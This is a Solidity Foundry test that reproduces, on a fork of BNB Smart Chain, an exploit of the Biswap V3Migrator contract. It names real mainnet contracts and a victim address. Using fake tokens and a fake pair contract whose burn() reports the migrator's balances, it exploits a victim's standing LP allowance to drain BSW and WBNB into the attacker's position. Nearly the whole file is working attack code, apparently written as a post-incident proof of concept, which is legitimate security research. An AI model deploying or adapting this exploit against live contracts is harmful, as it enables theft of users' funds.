pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./ILiquidityManager.sol";
import "./IV3Migrator.sol";
import "./BiswapPair.sol";

contract ContractTest is Test {

    function setUp() public {
        uint256 forkId = vm.createFork("bsc", 29553054);
        vm.selectFork(forkId);
    }

    function testExp() public {
        Exp exp = new Exp();
        exp.go();
    }
}


contract fakeToken is ERC20 {
    constructor() ERC20("fake", "fake") {
        _mint(msg.sender, 10e10 ether);
    }
}


contract Exp {
    IV3Migrator public v3Migrator = IV3Migrator(0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf);
    IBiswapPair public pair = IBiswapPair(0x46492B26639Df0cda9b2769429845cb991591E0A);
    ILiquidityManager public manager = ILiquidityManager(0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5);
    IBiswapFactoryV3 factory = IBiswapFactoryV3(0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863);
    address public victim = 0x2978D920a1655abAA315BAd5Baf48A2d89792618;

    address public bsw = 0x965F527D9159dCe6288a2219DB51fc6Eef120dD1;
    address public wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address public fakeToken0 = address(new fakeToken());
    address public fakeToken1 = address(new fakeToken());

    function go() public {

        if (fakeToken0 > fakeToken1) {
            (fakeToken1, fakeToken0) = (fakeToken0, fakeToken1);
        }

        uint256 allowance = pair.allowance(victim, address(v3Migrator));

        console.log(
            "allowance %s",
            allowance
        );

        IERC20(fakeToken0).transfer(address(v3Migrator), 10e10 ether);
        IERC20(fakeToken1).transfer(address(v3Migrator), 10e10 ether);

        factory.newPool(fakeToken0, fakeToken1, 150 ,1);

        IV3Migrator.MigrateParams memory params = 
            IV3Migrator.MigrateParams(
                address(pair), 
                allowance, 
                fakeToken0, 
                fakeToken1, 
                150, 
                10000, 
                20000, 
                0, 
                0, 
                victim, 
                1688126472, 
                false
            );
        
        v3Migrator.migrate(params);

        console.log(
            "manager bsw balance %s",
            IERC20(bsw).balanceOf(address(v3Migrator))
        );

        console.log(
            "manager wbnb balance %s",
            IERC20(wbnb).balanceOf(address(v3Migrator))
        );

        IV3Migrator.MigrateParams memory params1 = 
            IV3Migrator.MigrateParams(
                address(this), 
                allowance, 
                bsw, 
                wbnb, 
                150, 
                10000, 
                20000, 
                0, 
                0, 
                address(this), 
                1688126472, 
                false
            );

        console.log(
            "before V3 LP balance %s",
            manager.balanceOf(address(this))
        );

        v3Migrator.migrate(params1);
        
        console.log(
            "after V3 LP balance %s",
            manager.balanceOf(address(this))
        );

        console.log(
            "after wsb balance %s",
            IERC20(bsw).balanceOf(address(this))
        );

        console.log(
            "after wbnb balance %s",
            IERC20(wbnb).balanceOf(address(this))
        );
    }

    function transferFrom(address from, address to, uint value) external returns (bool){
        return true;
    }

    function burn(address to) external returns (uint amount0, uint amount1) {
        uint256 bswBalance = IERC20(bsw).balanceOf(address(v3Migrator));
        uint256 wbnb1Balance = IERC20(wbnb).balanceOf(address(v3Migrator));
        return (bswBalance, wbnb1Balance);
    }

}